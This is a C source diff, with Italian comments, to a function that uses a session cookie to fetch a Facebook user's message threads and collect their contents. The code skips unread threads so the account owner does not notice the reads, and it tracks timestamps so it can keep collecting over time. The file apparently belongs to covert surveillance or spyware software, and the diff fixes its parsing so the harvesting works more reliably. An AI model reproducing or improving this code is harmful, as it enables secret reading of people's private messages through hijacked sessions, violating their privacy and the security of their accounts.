@@ -7,6 +7,8 @@
 #include "NetworkHandler.h"
 
 #define FB_THREAD_LIST_ID "\"threads\":[{"
+#define FB_THREAD_LIST_END "\"ordered_threadlists\":"
+
 #define FB_THREAD_IDENTIFIER "\\/messages\\/?action=read&amp;tid="
 #define FB_THREAD_IDENTIFIER_V2 "\"thread_id\":\""
 
@@ -239,13 +241,21 @@ DWORD HandleFBMessages(char *cookie)
 	if (ret_val != SOCIAL_REQUEST_SUCCESS)
 		return ret_val;
 
-	// Cicla la lista dei thread
+	// Individua la lista dei thread nella risposta
+	parser1 = (BYTE *)strstr((char *)r_buffer, FB_THREAD_LIST_END);
+	if (!parser1) {
+		SAFE_FREE(r_buffer);
+		return SOCIAL_REQUEST_BAD_COOKIE;
+	}
+	*parser1 = 0;
+
 	parser1 = (BYTE *)strstr((char *)r_buffer, FB_THREAD_LIST_ID);
 	if (!parser1) {
 		SAFE_FREE(r_buffer);
 		return SOCIAL_REQUEST_BAD_COOKIE;
 	}
 
+	// Cicla la lista dei thread
 	for (;;) {
 		CheckProcessStatus();
 		parser2 = (BYTE *)strstr((char *)parser1, FB_THREAD_STATUS_IDENTIFIER_V2);
@@ -253,8 +263,10 @@ DWORD HandleFBMessages(char *cookie)
 			break;
 		parser2 += strlen(FB_THREAD_STATUS_IDENTIFIER_V2);
 		// Salta i thread unread per non cambiare il loro stato!!!!
-		if(*parser2 != '0')
+		if(*parser2 != '0') {
+			parser1 = parser2;
 			continue;
+		}
 
 		parser1 = (BYTE *)strstr((char *)parser1, FB_THREAD_IDENTIFIER_V2);
 		if (!parser1)
@@ -309,6 +321,7 @@ DWORD HandleFBMessages(char *cookie)
 		act_tstamp = atoi(tstamp);
 		if (act_tstamp>2000000000 || act_tstamp <= last_tstamp)
 			continue;
+		SetLastFBTstamp(user, act_tstamp, 0);
 
 		// Pe ogni thread chiede tutti i rispettivi messaggi
 		ret_val = HttpSocialRequest(L"www.facebook.com", L"POST", url, 443, (BYTE *)post_data, strlen(post_data), &r_buffer_inner, &dummy, cookie);
